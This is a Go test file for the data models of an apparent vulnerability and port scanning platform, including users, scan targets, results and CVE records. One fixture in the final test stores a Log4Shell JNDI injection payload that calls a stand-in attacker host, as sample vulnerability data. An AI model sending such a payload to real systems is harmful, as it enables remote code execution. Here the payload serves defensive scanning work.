package models

import (
	"testing"
	"time"
	"github.com/stretchr/testify/assert"
)

// 测试用户模型
func TestUserModel(t *testing.T) {
	t.Run("User model fields", func(t *testing.T) {
		user := User{
			Username:     "testuser",
			Email:        "test@example.com",
			PasswordHash: "hashed_password",
			Is2FAEnabled: false,
			TOTPSecret:   "secret",
			Role:         "user",
			CreatedAt:    time.Now().Unix(),
			UpdatedAt:    time.Now().Unix(),
		}

		assert.Equal(t, "testuser", user.Username)
		assert.Equal(t, "test@example.com", user.Email)
		assert.Equal(t, "user", user.Role)
		assert.False(t, user.Is2FAEnabled)
	})

	t.Run("User table name", func(t *testing.T) {
		user := User{}
		assert.Equal(t, "users", user.TableName())
	})
}

// 测试项目模型
func TestProjectOptimizedModel(t *testing.T) {
	t.Run("Project model fields", func(t *testing.T) {
		project := ProjectOptimized{
			Name:        "Test Project",
			Description: "A test project",
			CreatedAt:   time.Now(),
			UpdatedAt:   time.Now(),
		}

		assert.Equal(t, "Test Project", project.Name)
		assert.Equal(t, "A test project", project.Description)
	})
}

// 测试扫描目标模型
func TestScanTargetModel(t *testing.T) {
	t.Run("ScanTarget model fields", func(t *testing.T) {
		target := ScanTarget{
			ProjectID: 1,
			Type:      "domain",
			Address:   "example.com",
			ParentID:  nil,
			CreatedAt: time.Now(),
			UpdatedAt: time.Now(),
		}

		assert.Equal(t, uint(1), target.ProjectID)
		assert.Equal(t, "domain", target.Type)
		assert.Equal(t, "example.com", target.Address)
		assert.Nil(t, target.ParentID)
	})

	t.Run("IsRoot method", func(t *testing.T) {
		rootTarget := ScanTarget{ParentID: nil}
		childTarget := ScanTarget{ParentID: &[]uint{1}[0]}

		assert.True(t, rootTarget.IsRoot())
		assert.False(t, childTarget.IsRoot())
	})

	t.Run("GetFullPath method", func(t *testing.T) {
		target := ScanTarget{Address: "subdomain.example.com"}
		assert.Equal(t, "subdomain.example.com", target.GetFullPath())
	})
}

// 测试扫描结果模型
func TestScanResultOptimizedModel(t *testing.T) {
	t.Run("ScanResult model fields", func(t *testing.T) {
		result := ScanResultOptimized{
			ProjectID:     1,
			TargetID:      1,
			Port:          80,
			Protocol:      "tcp",
			State:         "open",
			ServiceName:   "http",
			Version:       "nginx/1.20.1",
			IsWebService:  true,
			HTTPTitle:     "Welcome",
			HTTPStatus:    200,
			CreatedAt:     time.Now(),
			UpdatedAt:     time.Now(),
		}

		assert.Equal(t, 80, result.Port)
		assert.Equal(t, "tcp", result.Protocol)
		assert.Equal(t, "open", result.State)
		assert.Equal(t, "http", result.ServiceName)
		assert.True(t, result.IsWebService)
		assert.Equal(t, 200, result.HTTPStatus)
	})

	t.Run("GetServiceSignature method", func(t *testing.T) {
		result1 := ScanResultOptimized{
			ServiceName: "nginx",
			Version:     "1.20.1",
		}
		result2 := ScanResultOptimized{
			ServiceName: "apache",
			Version:     "",
		}

		assert.Equal(t, "nginx/1.20.1", result1.GetServiceSignature())
		assert.Equal(t, "apache", result2.GetServiceSignature())
	})
}

// 测试漏洞模型
func TestVulnerabilityOptimizedModel(t *testing.T) {
	t.Run("Vulnerability model fields", func(t *testing.T) {
		vuln := VulnerabilityOptimized{
			ScanResultID: 1,
			CVEID:        "CVE-2021-44228",
			Title:        "Log4j RCE",
			Description:  "Remote Code Execution in Log4j",
			Severity:     "critical",
			CVSS:         10.0,
			Status:       "open",
			CreatedAt:    time.Now(),
			UpdatedAt:    time.Now(),
		}

		assert.Equal(t, uint(1), vuln.ScanResultID)
		assert.Equal(t, "CVE-2021-44228", vuln.CVEID)
		assert.Equal(t, "critical", vuln.Severity)
		assert.Equal(t, 10.0, vuln.CVSS)
		assert.Equal(t, "open", vuln.Status)
	})

	t.Run("IsCritical method", func(t *testing.T) {
		criticalVuln := VulnerabilityOptimized{Severity: "critical"}
		highVuln := VulnerabilityOptimized{Severity: "high"}

		assert.True(t, criticalVuln.IsCritical())
		assert.False(t, highVuln.IsCritical())
	})

	t.Run("IsOpen method", func(t *testing.T) {
		openVuln := VulnerabilityOptimized{Status: "open"}
		fixedVuln := VulnerabilityOptimized{Status: "fixed"}

		assert.True(t, openVuln.IsOpen())
		assert.False(t, fixedVuln.IsOpen())
	})
}

// 测试Web路径模型
func TestWebPathOptimizedModel(t *testing.T) {
	t.Run("WebPath model fields", func(t *testing.T) {
		webPath := WebPathOptimized{
			ScanResultID: 1,
			Path:         "/admin",
			StatusCode:   200,
			Title:        "Admin Panel",
			Length:       1024,
			CreatedAt:    time.Now(),
			UpdatedAt:    time.Now(),
		}

		assert.Equal(t, uint(1), webPath.ScanResultID)
		assert.Equal(t, "/admin", webPath.Path)
		assert.Equal(t, 200, webPath.StatusCode)
		assert.Equal(t, "Admin Panel", webPath.Title)
		assert.Equal(t, 1024, webPath.Length)
	})
}

// 测试技术栈模型
func TestTechnologyOptimizedModel(t *testing.T) {
	t.Run("Technology model fields", func(t *testing.T) {
		tech := TechnologyOptimized{
			Name:      "nginx",
			Category:  "web_server",
			CreatedAt: time.Now(),
			UpdatedAt: time.Now(),
		}

		assert.Equal(t, "nginx", tech.Name)
		assert.Equal(t, "web_server", tech.Category)
	})
}

// 测试扫描框架结果模型
func TestScanFrameworkResultModel(t *testing.T) {
	t.Run("ScanFrameworkResult table name", func(t *testing.T) {
		result := ScanFrameworkResult{}
		assert.Equal(t, "scan_framework_results", result.TableName())
	})

	t.Run("ScanFrameworkResult fields", func(t *testing.T) {
		result := ScanFrameworkResult{
			ProjectID:    1,
			ScanTargetID: 1,
			Target:       "example.com",
			ScanType:     "port_scan",
			ScannerName:  "nmap",
			Status:       "completed",
			StartTime:    time.Now(),
			EndTime:      time.Now(),
			RawData:      "nmap scan results...",
			CreatedAt:    time.Now(),
			UpdatedAt:    time.Now(),
		}

		assert.Equal(t, uint(1), result.ProjectID)
		assert.Equal(t, "example.com", result.Target)
		assert.Equal(t, "port_scan", result.ScanType)
		assert.Equal(t, "nmap", result.ScannerName)
		assert.Equal(t, "completed", result.Status)
	})
}

// 测试扫描框架目标模型
func TestScanFrameworkTargetModel(t *testing.T) {
	t.Run("ScanFrameworkTarget table name", func(t *testing.T) {
		target := ScanFrameworkTarget{}
		assert.Equal(t, "scan_framework_targets", target.TableName())
	})

	t.Run("ScanFrameworkTarget fields", func(t *testing.T) {
		target := ScanFrameworkTarget{
			ProjectID:  1,
			Target:     "example.com",
			TargetType: "domain",
			CreatedAt:  time.Now(),
			UpdatedAt:  time.Now(),
		}

		assert.Equal(t, uint(1), target.ProjectID)
		assert.Equal(t, "example.com", target.Target)
		assert.Equal(t, "domain", target.TargetType)
	})
}

// 测试导入数据结构
func TestImportDataStructures(t *testing.T) {
	t.Run("ScanDataImport structure", func(t *testing.T) {
		importData := ScanDataImport{
			ProjectID: 1,
			Results: []ScanTargetImport{
				{
					Type:    "domain",
					Address: "example.com",
					Ports: []PortScanImport{
						{
							Number:   80,
							Protocol: "tcp",
							State:    "open",
							Service: &ServiceScanImport{
								Name:         "http",
								Version:      "nginx/1.20.1",
								IsWebService: true,
								HTTPStatus:   200,
							},
						},
					},
				},
			},
		}

		assert.Equal(t, uint(1), importData.ProjectID)
		assert.Len(t, importData.Results, 1)
		assert.Equal(t, "domain", importData.Results[0].Type)
		assert.Equal(t, "example.com", importData.Results[0].Address)
		assert.Len(t, importData.Results[0].Ports, 1)
		assert.Equal(t, 80, importData.Results[0].Ports[0].Number)
		assert.NotNil(t, importData.Results[0].Ports[0].Service)
		assert.Equal(t, "http", importData.Results[0].Ports[0].Service.Name)
	})

	t.Run("VulnerabilityImport structure", func(t *testing.T) {
		vulnImport := VulnerabilityImport{
			CVEID:       "CVE-2021-44228",
			Title:       "Log4j RCE",
			Description: "Remote Code Execution",
			Severity:    "critical",
			CVSS:        10.0,
			Location:    "/api/login",
			Parameter:   "username",
			Payload:     "${jndi:ldap://attacker.com/a}",
		}

		assert.Equal(t, "CVE-2021-44228", vulnImport.CVEID)
		assert.Equal(t, "critical", vulnImport.Severity)
		assert.Equal(t, 10.0, vulnImport.CVSS)
	})
}